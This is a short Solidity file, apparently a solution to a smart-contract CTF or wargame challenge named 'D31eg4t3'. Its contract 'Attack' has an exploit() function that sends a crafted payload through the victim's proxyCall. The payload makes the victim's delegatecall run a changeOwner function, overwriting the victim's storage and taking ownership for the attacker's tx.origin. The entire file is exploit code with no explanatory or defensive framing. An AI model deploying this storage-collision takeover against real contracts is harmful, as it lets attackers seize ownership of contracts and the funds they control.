// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ID31eg4t3 {
    function proxyCall(bytes calldata data) external returns (address);
}

contract Attack {
    address internal immutable victim;
    address public owner;
    mapping(address => bool) public result;

    constructor(address addr) payable {
        victim = addr;
        owner = msg.sender; // 直接設置部署者為owner
    }

    function changeOwner(address newOwner) public {
        require(msg.sender == owner, "Only the owner can change the owner.");
        owner = newOwner;
        result[owner] = true;
    }

    function exploit() external {
        bytes memory data = abi.encodeWithSelector(ID31eg4t3.proxyCall.selector, abi.encodeWithSelector(this.changeOwner.selector, tx.origin));
        ID31eg4t3(victim).proxyCall(data);
    }
}
